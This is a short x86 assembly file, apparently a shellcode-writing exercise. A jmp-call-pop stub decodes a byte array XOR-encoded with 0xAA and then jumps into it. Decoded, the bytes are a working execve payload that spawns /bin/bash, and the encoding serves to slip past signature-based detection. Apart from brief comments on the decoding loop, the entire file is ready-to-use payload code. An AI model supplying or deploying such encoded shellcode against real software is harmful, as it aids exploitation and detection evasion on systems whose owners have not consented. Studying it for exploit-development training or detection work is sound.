section .mytext progbits alloc exec write align=16 ; allow stack writing
; have to change from .text or linker overrides "write"
global _start
_start:

	jmp short call_decoder

decoder:
	pop esi

decode:
	xor byte [esi], 0xAA
	jz Shellcode	; jump if the XOR operation results in 0, which sets the 0 flag
	inc esi		; if 0 flag isn't set, inc esi and jmp back to the xor operation
	jmp short decode

call_decoder:
	call decoder
	Shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc8,0xcb,0xd9,0xc2,0xc2,0xc8,0xc3,0xc4,0x85,0xc2,0x85,0x85,0x85,0x85,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a, 0xAA

; by XOR'ing 0xAA with itself, we get 0, which sets the 0 flag.
; using a conditional jump, we don't need to set up a loop
